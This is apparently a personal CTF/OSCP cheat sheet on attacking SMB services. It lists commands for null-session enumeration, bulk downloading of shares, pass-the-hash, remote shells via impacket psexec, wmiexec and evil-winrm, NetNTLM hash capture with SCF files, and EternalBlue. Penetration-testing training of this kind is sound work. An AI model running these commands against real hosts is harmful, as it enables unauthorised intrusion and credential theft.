# SMB (139,445)

## Up
- [[Services]]

SMB (file sharing, 445; NetBIOS 139; RPC 135) is a top CTF target — especially on Windows. Wins: **null/guest sessions**, readable shares (creds/scripts), **credential reuse → RCE**, and classic version exploits (EternalBlue).

---

## Enumerate

```bash
nmap -p139,445 -sC -sV $IP
nmap --script "smb-vuln-*" -p445 $IP           # ms17-010 (EternalBlue) etc.

enum4linux-ng -A $IP                            # the all-in-one (users, shares, groups, policy)
crackmapexec smb $IP                            # OS, domain, signing, SMB version
crackmapexec smb $IP -u '' -p '' --shares       # null session shares
crackmapexec smb $IP -u guest -p '' --shares

# list & browse shares
smbclient -L //$IP/ -N                          # null-session share list
smbclient //$IP/share -N                        # connect (get/put/recurse)
smbmap -H $IP -u null                            # shows READ/WRITE perms per share
smbmap -H $IP -u user -p pass
```

## Foothold Techniques

```bash
# read a share → grab creds/scripts/configs
smbclient //$IP/Users -N -c 'recurse ON; prompt OFF; mget *'

# with creds → get a shell if user is local admin (Pwn3d!)
crackmapexec smb $IP -u user -p pass            # (Pwn3d!) = admin
impacket-psexec corp/user:pass@$IP              # → SYSTEM
impacket-wmiexec corp/user@$IP -hashes :<NTLM>  # pass-the-hash, quieter
evil-winrm -i $IP -u user -p pass               # if WinRM open ([[WinRM (5985,5986)]])

# writable share → drop payload / SCF/lnk capture / webshell if it maps to web root
# version exploit
searchsploit smb ; # MS17-010 EternalBlue on unpatched Win7/2008:
# use vetted PoC (e.g. AutoBlue) — reliable SYSTEM shell
```

---

## Common Misconfigurations / Exploits

- **Null / guest session** → enumerate users, shares, password policy.
- **Readable shares** with scripts/configs/backups → creds, hostnames, keys.
- **Writable shares** → drop payloads, SCF/URL files to **capture NetNTLM hashes** (→ `responder`/crack), or webshell if share == web root.
- **Credential reuse** → `psexec`/`wmiexec`/`evil-winrm` → SYSTEM.
- **EternalBlue (MS17-010)**, **SMBGhost (CVE-2020-0796)** on old/unpatched hosts.
- **Pass-the-Hash** — no cracking needed; use the NTLM directly.

---

## OSCP Tips

- Start with **`enum4linux-ng`** + **null session** (`smbclient -L //$IP/ -N`).
- **`smbmap`** quickly shows which shares are READ vs WRITE.
- `(Pwn3d!)` in CrackMapExec = local admin → `psexec`/`wmiexec` → SYSTEM.
- Domain-joined? Users/shares here feed [[Active Directory]]; **reuse creds/hashes** across hosts.
- Grab **everything** from readable shares — CTFs stash creds and scripts in SMB.
